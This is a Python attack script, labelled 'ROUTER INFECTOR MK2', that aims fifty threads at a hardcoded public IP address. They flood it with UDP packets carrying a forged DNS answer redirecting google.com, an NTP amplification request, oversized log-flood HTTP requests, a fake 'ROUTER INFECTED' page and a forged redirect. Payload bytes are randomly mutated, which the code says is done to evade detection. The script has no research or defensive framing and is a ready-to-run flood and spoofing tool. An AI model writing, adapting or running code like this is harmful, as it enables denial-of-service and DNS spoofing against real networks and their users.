import socket
import threading
import time
import random

target = "62.109.121.42"

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# INFECTION PAYLOADS
INFECTION_PAYLOADS = [
    # 1. DNS CACHE POISON INFECTOR
    {
        "name": "DNS-POISON",
        "payload": b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04\x0a\x0a\x0a\x01',
        "port": 53,
        "effect": "Redirects google.com to 10.10.10.1"
    },
    
    # 2. NTP MONLIST (480 Bytes)
    {
        "name": "NTP-AMP",
        "payload": b'\x17\x00\x03\x2a' + b'\x00' * 476,
        "port": 123,
        "effect": "NTP amplification attack"
    },
    
    # 3. LOG OVERFLOW
    {
        "name": "LOG-FLOOD",
        "payload": b'GET /' + b'A' * 500 + b' HTTP/1.1\r\nHost: ' + b'X' * 200 + b'\r\nUser-Agent: ' + b'Mozilla/' + b'5' * 100 + b'\r\n\r\n',
        "port": 80,
        "effect": "Fills router logs"
    },
    
    # 4. ERROR INJECTION
    {
        "name": "ERROR-MSG",
        "payload": b'HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\nContent-Length: 150\r\n\r\n<html><body><h1>ROUTER INFECTED</h1><p>Network security compromised. Contact administrator immediately.</p></body></html>',
        "port": 8080,
        "effect": "Shows infection message"
    },
    
    # 5. REDIRECT ATTACKS
    {
        "name": "REDIRECT",
        "payload": b'HTTP/1.1 302 Found\r\nLocation: http://192.168.1.1:80/login.html?error=1\r\nCache-Control: max-age=3600\r\nContent-Length: 0\r\n\r\n',
        "port": 80,
        "effect": "Redirects to router login"
    }
]

# Stats
infection_counts = {p["name"]: 0 for p in INFECTION_PAYLOADS}
total_packets = 0
start_time = time.time()

# Mutate payload to avoid detection
def mutate_payload(payload, mutation_rate=0.3):
    """Randomly mutate bytes in payload"""
    if random.random() > mutation_rate:
        return payload
    
    mutated = bytearray(payload)
    # Flip 1-5 random bytes
    for _ in range(random.randint(1, 5)):
        if len(mutated) > 0:
            idx = random.randint(0, len(mutated) - 1)
            mutated[idx] = random.randint(0, 255)
    return bytes(mutated)

# Infection attack thread
def infection_attacker():
    global total_packets
    
    # Create socket pool
    socks = []
    for _ in range(5):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            socks.append(sock)
        except:
            pass
    
    if not socks:
        return
    
    while True:
        try:
            # Pick random infection
            infection = random.choice(INFECTION_PAYLOADS)
            
            # Mutate payload
            payload = mutate_payload(infection["payload"])
            
            # Pick random socket
            sock = random.choice(socks)
            
            # Send infection
            sock.sendto(payload, (target, infection["port"]))
            
            # Update stats
            infection_counts[infection["name"]] += 1
            total_packets += 1
            
        except:
            # Recreate broken socket
            try:
                socks.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
            except:
                pass

# Start infection
print(f"{RED}{'='*60}{RESET}")
print(f"{YELLOW}ROUTER INFECTOR MK2 - ACTIVE{RESET}")
print(f"{RED}Target: {target}{RESET}")
print(f"{CYAN}Payloads: DNS Poison, NTP Amp, Log Flood, Error Msg, Redirect{RESET}")
print(f"{RED}Effect: Router infection + user confusion{RESET}")
print(f"{RED}{'='*60}{RESET}")

# Start 50 infection threads
for i in range(50):
    t = threading.Thread(target=infection_attacker)
    t.daemon = True
    t.start()

# Logging
last_log = time.time()
while True:
    time.sleep(1)
    current = time.time()
    
    if current - last_log >= 2:  # Log every 2 seconds
        elapsed = current - start_time
        pps = total_packets / elapsed if elapsed > 0 else 0
        
        # Find most active infection
        top_infection = max(infection_counts.items(), key=lambda x: x[1])
        
        print(f"{RED}INFECTOR{RESET}:{GREEN}{int(pps)}/s{RESET} | TOP: {CYAN}{top_infection[0]}{RESET}:{YELLOW}{top_infection[1]}{RESET}")
        
        # Reset every 30 seconds
        if elapsed >= 30:
            total_packets = 0
            infection_counts = {p["name"]: 0 for p in INFECTION_PAYLOADS}
            start_time = time.time()
        
        last_log = current
